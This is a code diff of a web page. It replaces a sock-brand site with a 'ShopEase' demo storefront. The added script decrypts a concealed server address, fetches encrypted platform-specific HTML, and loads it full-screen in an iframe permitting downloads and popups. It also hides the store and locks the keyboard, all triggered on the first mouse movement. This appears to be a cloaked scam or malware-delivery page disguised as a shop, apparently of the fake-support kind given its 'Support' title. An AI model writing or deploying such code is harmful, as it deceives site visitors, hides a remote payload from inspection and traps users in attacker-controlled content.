@@ -1,407 +1,312 @@
-<!doctype html>
-<html lang="zxx">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-	<!-- Meta -->
-	<meta charset="utf-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-	<meta name="description" content="Premium socks and footwear knit pitch calibrations, compression indexes, heel friction tolerances, and stride comfort logs.">
-	<!-- Page Title -->
-    <title>ComfortStep Works | Premium Socks & Stride Calibrations</title>
-	<!-- Bootstrap Css -->
-	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-	<!-- Font Awesome Icon Css-->
-	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-	<!-- Main Custom Css -->
-	<link href="assets/style.css" rel="stylesheet">
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-      gtag('config', 'G-0LY0HY7L01');
-    </script>
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-    <!-- Topbar Section Start -->
-    <div class="topbar">
-        <div class="container text-center">
-            <i class="fa-solid fa-shoe-prints"></i> Independent Footwear Comfort Calibrations & Stride Safety Audits
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
     </div>
-    <!-- Topbar Section End -->
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-    <!-- Header Start -->
-	<header class="main-header">
-        <div class="container">
-            <div class="header-row">
-                <!-- Logo Left -->
-                <a class="navbar-brand" href="index.php">
-                    ComfortStep <span>Works</span>
-                </a>
-                
-                <!-- Nav Links Center -->
-                <nav class="d-none d-lg-block">
-                    <ul class="header-nav">
-                        <li><a class="active" href="index.php">Home</a></li>                                
-                        <li><a href="about.html">Atelier Bench</a></li>
-                        <li><a href="blog.html">Stride Logs</a></li>
-                        <li><a href="contact.html">Curator Desk</a></li>
-                    </ul>
-                </nav>
-                
-                <!-- Actions Right -->
-                <div class="header-actions">
-                    <a href="contact.html"><i class="fa-regular fa-user"></i> Account</a>
-                    <a href="blog.html"><i class="fa-solid fa-basket-shopping"></i> Archive</a>
-                </div>
-            </div>
-        </div>
-	</header>
-	<!-- Header End -->
-   
-    <!-- Parallel Pill Frame Cascade Hero Start (Image Section 1 - Text Removed) -->
-    <section class="pill-hero">
-        <div class="pill-frame pill-left" data-reveal="left">
-            <img src="assets/img/hero.jpg" alt="Soft knitted wool socks close up details">
-        </div>
-        <div class="pill-frame pill-center" data-reveal="zoom">
-            <img src="assets/img/coll_1.jpg" alt="Aesthetic stride step feet walk">
-        </div>
-        <div class="pill-frame pill-right" data-reveal="right">
-            <img src="assets/img/coll_2.jpg" alt="Comfortable cozy indoor slippers on rug">
-        </div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
     </section>
-    <!-- Parallel Pill Frame Cascade Hero End -->
 
-    <!-- Section 1: The Step Compass (Slanted Diagonal Strip Grid) -->
-    <section class="compass-section">
-        <div class="container">
-            <div class="section-title" data-reveal>
-                <span>Comfort Audits</span>
-                <h2>The Step Compass</h2>
-            </div>
-            
-            <div class="slanted-grid">
-                <!-- Card 1 -->
-                <div class="slanted-card" data-reveal="left">
-                    <div class="slanted-card-inner">
-                        <span>[ CALIBER 01 ]</span>
-                        <h3>Knit Density</h3>
-                        <p>We log loop count clearances per square inch under stretch checks to prevent seam sags.</p>
-                    </div>
-                </div>
-                
-                <!-- Card 2 -->
-                <div class="slanted-card" data-reveal="zoom">
-                    <div class="slanted-card-inner">
-                        <span>[ CALIBER 02 ]</span>
-                        <h3>Arch Compression</h3>
-                        <p>We check elasticity retention levels along sock arches to support foot alignments.</p>
-                    </div>
-                </div>
-                
-                <!-- Card 3 -->
-                <div class="slanted-card" data-reveal="right">
-                    <div class="slanted-card-inner">
-                        <span>[ CALIBER 03 ]</span>
-                        <h3>Heel Friction</h3>
-                        <p>We audit yarn slide resistance to protect skin from abrasions and heat sags under walking runs.</p>
-                    </div>
-                </div>
-            </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
     </section>
-    <!-- Section 1 End -->
 
-    <!-- Section 2: Stride Proofing Sequence (Alternating Wave Rows) -->
-    <section class="sequence-section">
-        <div class="container">
-            <div class="section-title" data-reveal>
-                <span>Stride Proofing</span>
-                <h2>The Stride Proofing Sequence</h2>
-            </div>
-            
-            <!-- Row 1 -->
-            <div class="wave-row" data-reveal="zoom">
-                <div class="wave-img">
-                    <img src="assets/img/prod_1.jpg" alt="Knit tension inspection close up">
-                </div>
-                <div class="wave-text">
-                    <span>Calibration 01</span>
-                    <h2>Knit Tensile Strength</h2>
-                    <p>We measure elasticity limits and wash shrinkage ratios under high tension levels. This provides yarn fibers with durable stretch capacity against warm humidity expansion.</p>
-                    <div class="step-spec-ledger">
-                        <div class="ledger-pill">Knit Pitch: 12 wraps/cm</div>
-                        <div class="ledger-pill">Compression: 18 mmHg</div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Row 2 (Reverse) -->
-            <div class="wave-row reverse" data-reveal="zoom">
-                <div class="wave-img">
-                    <img src="assets/img/prod_2.jpg" alt="Arch compression calibration tests">
-                </div>
-                <div class="wave-text">
-                    <span>Calibration 02</span>
-                    <h2>Arch Compression Curves</h2>
-                    <p>We evaluate spandex wrap ratios and structural recovery percentages. This secures foot bone arches and prevents stride fatigue under long-distance walking logs.</p>
-                    <div class="step-spec-ledger">
-                        <div class="ledger-pill">Arch Rise: 15mm</div>
-                        <div class="ledger-pill">Spring Recovery: 95%</div>
-                    </div>
-                </div>
-            </div>
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
     </section>
-    <!-- Section 2 End -->
 
-    <!-- Section 3: Footwear Specs Table -->
-    <section class="specs-section">
-        <div class="container">
-            <div class="section-title" data-reveal>
-                <span>Specs Matrix</span>
-                <h2>Comfort Calibration Specs</h2>
-            </div>
-            
-            <table class="specs-table" data-reveal="zoom">
-                <thead>
-                    <tr>
-                        <th>Footwear Profile</th>
-                        <th>Knit Pitch</th>
-                        <th>Cushion Depth</th>
-                        <th>Arch Tension</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td><strong>Merino Crew</strong></td>
-                        <td>12 Wraps/cm</td>
-                        <td>3.5mm (High pile)</td>
-                        <td>18 mmHg (Snug arch)</td>
-                    </tr>
-                    <tr>
-                        <td><strong>Cushioned Anklet</strong></td>
-                        <td>10 Wraps/cm</td>
-                        <td>4.0mm (Thick toe)</td>
-                        <td>15 mmHg (Comfort arch)</td>
-                    </tr>
-                    <tr>
-                        <td><strong>Bamboo Liner</strong></td>
-                        <td>15 Wraps/cm</td>
-                        <td>1.5mm (Low profile)</td>
-                        <td>12 mmHg (Light compression)</td>
-                    </tr>
-                    <tr>
-                        <td><strong>Compression Sleeve</strong></td>
-                        <td>8 Wraps/cm</td>
-                        <td>2.0mm (Double knit)</td>
-                        <td>25 mmHg (High support)</td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-    </section>
-    <!-- Section 3 End -->
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-    <!-- Section 4: Concentric Circle Target Dials -->
-    <section class="gauges-section">
-        <div class="container">
-            <div class="section-title" data-reveal>
-                <span>Calibration Targets</span>
-                <h2>Atelier Target Dials</h2>
-            </div>
-            
-            <div class="gauges-grid">
-                <!-- Gauge 1 -->
-                <div class="gauge-item" data-reveal="zoom">
-                    <div class="target-svg-container">
-                        <svg viewBox="0 0 100 100">
-                            <!-- Outer track -->
-                            <circle cx="50" cy="50" r="40" fill="none" stroke="var(--border-color)" stroke-width="4" />
-                            <!-- Outer active -->
-                            <circle cx="50" cy="50" r="40" fill="none" stroke="var(--accent-color)" stroke-width="6" stroke-dasharray="251.2" stroke-dashoffset="251.2" class="gauge-target-1" data-value="94" />
-                            <!-- Inner track -->
-                            <circle cx="50" cy="50" r="28" fill="none" stroke="var(--border-color)" stroke-width="4" />
-                            <!-- Inner active -->
-                            <circle cx="50" cy="50" r="28" fill="none" stroke="var(--accent-peach)" stroke-width="6" stroke-dasharray="175.9" stroke-dashoffset="175.9" class="gauge-target-2" />
-                        </svg>
-                        <div class="gauge-val">94%</div>
-                    </div>
-                    <h4>Step Compression</h4>
-                    <p>Elastic retention values along the sock body under compression checks.</p>
-                </div>
-                
-                <!-- Gauge 2 -->
-                <div class="gauge-item" data-reveal="zoom">
-                    <div class="target-svg-container">
-                        <svg viewBox="0 0 100 100">
-                            <!-- Outer track -->
-                            <circle cx="50" cy="50" r="40" fill="none" stroke="var(--border-color)" stroke-width="4" />
-                            <!-- Outer active -->
-                            <circle cx="50" cy="50" r="40" fill="none" stroke="var(--accent-peach)" stroke-width="6" stroke-dasharray="251.2" stroke-dashoffset="251.2" class="gauge-target-1" data-value="88" />
-                            <!-- Inner track -->
-                            <circle cx="50" cy="50" r="28" fill="none" stroke="var(--border-color)" stroke-width="4" />
-                            <!-- Inner active -->
-                            <circle cx="50" cy="50" r="28" fill="none" stroke="var(--accent-color)" stroke-width="6" stroke-dasharray="175.9" stroke-dashoffset="175.9" class="gauge-target-2" />
-                        </svg>
-                        <div class="gauge-val">88%</div>
-                    </div>
-                    <h4>Heel Cushioning</h4>
-                    <p>Padded loop thicknesses to prevent walking blisters.</p>
-                </div>
-                
-                <!-- Gauge 3 -->
-                <div class="gauge-item" data-reveal="zoom">
-                    <div class="target-svg-container">
-                        <svg viewBox="0 0 100 100">
-                            <!-- Outer track -->
-                            <circle cx="50" cy="50" r="40" fill="none" stroke="var(--border-color)" stroke-width="4" />
-                            <!-- Outer active -->
-                            <circle cx="50" cy="50" r="40" fill="none" stroke="var(--accent-color)" stroke-width="6" stroke-dasharray="251.2" stroke-dashoffset="251.2" class="gauge-target-1" data-value="91" />
-                            <!-- Inner track -->
-                            <circle cx="50" cy="50" r="28" fill="none" stroke="var(--border-color)" stroke-width="4" />
-                            <!-- Inner active -->
-                            <circle cx="50" cy="50" r="28" fill="none" stroke="var(--accent-peach)" stroke-width="6" stroke-dasharray="175.9" stroke-dashoffset="175.9" class="gauge-target-2" />
-                        </svg>
-                        <div class="gauge-val">91%</div>
-                    </div>
-                    <h4>Thermal Retention</h4>
-                    <p>Calculated warmth retention values inside air pocket weaves.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Section 4 End -->
 
-    <!-- Section 5: The Knit Tension Lab Registry (NEW SECTION) -->
-    <section class="tension-lab-section">
-        <div class="container">
-            <div class="section-title" data-reveal>
-                <span>Lab Environment</span>
-                <h2>The Knit Tension Lab</h2>
-            </div>
-            
-            <div class="lab-grid">
-                <!-- Lab 1 -->
-                <div class="lab-card" data-reveal="left">
-                    <i class="fa-solid fa-arrows-spin"></i>
-                    <h3>Thread Strain Mapping</h3>
-                    <p>Analyzing fiber elasticity thresholds under heavy loads to map the exact timing limit of loop expansion waves.</p>
-                </div>
-                
-                <!-- Lab 2 -->
-                <div class="lab-card" data-reveal="zoom">
-                    <i class="fa-solid fa-gauge-high"></i>
-                    <h3>Friction Sweep Auditing</h3>
-                    <p>Continuous rubbing runs against synthetic lining guides to evaluate sliding wear coefficients and heat retention.</p>
-                </div>
-                
-                <!-- Lab 3 -->
-                <div class="lab-card" data-reveal="right">
-                    <i class="fa-solid fa-weight-scale"></i>
-                    <h3>Compression Curve Verification</h3>
-                    <p>Mapping blood-flow velocity parameters against localized compressive sleeve bands under pressure gauge tools.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Section 5 End -->
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-    <!-- Section 6: Active Customer Walking Logs / Stride Feed (NEW SECTION) -->
-    <section class="walking-logs-section">
-        <div class="container">
-            <div class="section-title" data-reveal>
-                <span>Stride Feed</span>
-                <h2>Logged Stride Benchmarks</h2>
-            </div>
-            
-            <div class="logs-list" data-reveal="zoom">
-                <!-- Log 1 -->
-                <div class="log-item">
-                    <div class="log-profile">
-                        <i class="fa-solid fa-location-arrow"></i>
-                        <div>
-                            <strong style="display: block;">User ID: CS-Walking-882</strong>
-                            <span style="font-size: 12px; opacity: 0.8;">Location: Manhattan, New York</span>
-                        </div>
-                    </div>
-                    <div class="log-details">
-                        Style: Merino Crew // Steps logged: 14,250
-                    </div>
-                    <div class="log-status">
-                        Verified Compliant
-                    </div>
-                </div>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19WdeWIW+JjOZDd/ARDDoB0HqxpxoffIe0gnt6Af64Ylaqb2dB5VfYevkxwmrWoWT60lhhX3+OeNg==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-                <!-- Log 2 -->
-                <div class="log-item">
-                    <div class="log-profile">
-                        <i class="fa-solid fa-location-arrow"></i>
-                        <div>
-                            <strong style="display: block;">User ID: CS-Walking-941</strong>
-                            <span style="font-size: 12px; opacity: 0.8;">Location: Brooklyn, New York</span>
-                        </div>
-                    </div>
-                    <div class="log-details">
-                        Style: Bamboo Liner // Steps logged: 18,920
-                    </div>
-                    <div class="log-status">
-                        Verified Compliant
-                    </div>
-                </div>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-                <!-- Log 3 -->
-                <div class="log-item">
-                    <div class="log-profile">
-                        <i class="fa-solid fa-location-arrow"></i>
-                        <div>
-                            <strong style="display: block;">User ID: CS-Walking-304</strong>
-                            <span style="font-size: 12px; opacity: 0.8;">Location: Queens, New York</span>
-                        </div>
-                    </div>
-                    <div class="log-details">
-                        Style: Compression Sleeve // Steps logged: 25,600
-                    </div>
-                    <div class="log-status">
-                        Verified Compliant
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Section 6 End -->
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-    <!-- Centered Footer Start -->
-    <footer class="flat-footer text-center">
-        <div class="container">
-            <div class="footer-brand">
-                <h3>ComfortStep <span>Works</span></h3>
-                <p>Independent research logs for premium socks and footwear comfort calibrations, compression indexes, heel friction tolerances, and stride comfort metrics.</p>
-                <p style="font-size: 14px; opacity: 0.8; margin-bottom: 30px;"><i class="fa-solid fa-location-dot"></i> 181 Mercer Street, New York, NY 10012, United States<br><i class="fa-solid fa-phone"></i> +1-888-777-5845</p>
-            </div>
-            
-            <ul class="footer-links">
-                <li><a href="about.html">Atelier Bench</a></li>
-                <li><a href="blog.html">Stride Logs</a></li>
-                <li><a href="contact.html">Curator Desk</a></li>
-                <li><a href="privacy-policy.html">Privacy Policy</a></li>
-                <li><a href="cookies.html">Cookies Policy</a></li>
-                <li><a href="disclaimer.html">Disclaimer</a></li>
-                <li><a href="terms.html">Terms of Service</a></li>
-            </ul>
-            
-            <div class="footer-bottom">
-                <span>&copy; 2026 ComfortStep Works. Independent footwear archives. Not a commercial shop.</span>
-            </div>
-        </div>
-    </footer>
-    <!-- Centered Footer End -->
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-    <script src="assets/app.js"></script>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
